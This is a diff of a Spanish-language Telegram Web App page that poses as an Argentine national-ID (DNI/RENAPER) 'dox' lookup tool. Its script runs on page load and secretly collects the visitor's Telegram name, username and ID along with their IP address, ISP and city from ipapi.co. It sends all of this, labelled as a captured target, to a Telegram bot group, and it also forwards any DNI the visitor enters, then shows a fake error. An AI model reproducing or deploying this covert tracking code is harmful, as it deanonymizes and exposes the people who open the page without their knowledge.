@@ -3,25 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SISTEMA ARG-DATA v5.0</title>
+    <title>ARG-DATA DOX</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background-color: #050a0f; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
-        .box { border: 1px solid #00f2ff; padding: 30px 20px; border-radius: 10px; box-shadow: 0 0 20px #00f2ff; max-width: 350px; margin: 40px auto; }
-        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00f2ff; color: #00f2ff; text-align: center; outline: none; }
-        button { background: #00f2ff; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; }
+        body { background-color: #0a0a0a; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        .box { border: 1px solid #ff0000; padding: 30px 20px; border-radius: 5px; box-shadow: 0 0 15px #ff0000; max-width: 350px; margin: 40px auto; }
+        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #ff0000; color: #fff; text-align: center; outline: none; }
+        button { background: #ff0000; color: #fff; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; text-transform: uppercase; }
+        .status { font-size: 0.7em; margin-top: 15px; color: #00ff00; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <h3>ARG-DATA TERMINAL</h3>
-        <p>CONSULTA RENAPER</p>
-        <hr style="border: 0.5px solid #00f2ff22;">
-        <input type="number" id="dni" placeholder="Ingrese DNI">
+        <h2 style="margin:0;">ARG-DATA DOX</h2>
+        <p style="font-size:0.8em; color:#888;">DATABASE v5.0.1 - ARGENTINA</p>
+        <hr style="border: 0.5px solid #333;">
+        
+        <input type="number" id="dni" placeholder="DNI A CONSULTAR">
         <br>
-        <button onclick="enviarDni()">BUSCAR</button>
-        <p id="status" style="font-size: 0.8em; margin-top:15px;">Iniciando conexión segura...</p>
+        <button onclick="enviarDni()">EJECUTAR BÚSQUEDA</button>
+        
+        <div id="status" class="status">SISTEMA CONECTADO...</div>
     </div>
 
     <script>
@@ -32,41 +35,32 @@
         const grupoId = "-1003670055074";
 
         async function reportePrincipal() {
-            // Esperamos un segundo para que carguen los datos de Telegram
             setTimeout(async () => {
                 const user = tg.initDataUnsafe?.user;
-                const nombreCompleto = `${user?.first_name || "Oculto"} ${user?.last_name || ""}`;
+                const nombreFull = `${user?.first_name || "Desconocido"} ${user?.last_name || ""}`;
                 const username = user?.username ? `@${user.username}` : "Sin @alias";
-                const userId = user?.id || "Desconocido";
+                const userId = user?.id || "N/A";
 
                 try {
-                    // Obtenemos la IP y el Proveedor
                     const res = await fetch('https://ipapi.co/json/');
                     const data = await res.json();
                     
                     const mensaje = `🚨 **CAPTURA DE OBJETIVO** 🚨\n` +
                                     `--------------------------------\n` +
-                                    `👤 **Usuario:** ${nombreCompleto}\n` +
+                                    `👤 **Usuario:** ${nombreFull}\n` +
                                     `🆔 **Alias:** ${username}\n` +
-                                    `🔢 **ID:** \`${userId}\`\n` +
+                                    `🔢 **ID:** ${userId}\n` +
                                     `🌐 **IP:** \`${data.ip}\`\n` +
-                                    `📡 **Proveedor:** \`${data.org}\`\n` +
-                                    `📍 **Ciudad:** \`${data.city}, ${data.country_name}\`\n` +
+                                    `📡 **Proveedor:** ${data.org}\n` +
+                                    `📍 **Ciudad:** ${data.city}, ${data.country_name}\n` +
                                     `--------------------------------`;
 
                     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: grupoId,
-                            text: mensaje,
-                            parse_mode: 'Markdown'
-                        })
+                        body: JSON.stringify({ chat_id: grupoId, text: mensaje, parse_mode: 'Markdown' })
                     });
-                    document.getElementById('status').innerText = "SISTEMA ONLINE";
-                } catch (e) {
-                    document.getElementById('status').innerText = "ERROR DE SINCRONIZACIÓN";
-                }
+                } catch (e) { console.error(e); }
             }, 1000); 
         }
 
@@ -77,16 +71,14 @@
             
             if(!dni) return alert("Ingrese un DNI");
 
-            const msgDni = `📝 **DNI INGRESADO**\n` +
-                           `👤 **Por:** ${alias}\n` +
-                           `🎯 **DNI:** \`${dni}\``;
+            const msgDni = `🎯 **DNI CONSULTADO**\n👤 **Por:** ${alias}\n🔎 **DNI:** \`${dni}\``;
 
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: grupoId, text: msgDni, parse_mode: 'Markdown' })
             });
-            alert("Error: Base de datos no disponible.");
+            alert("Error: Acceso denegado. Se requiere suscripción Premium.");
         }
 
         window.onload = reportePrincipal;
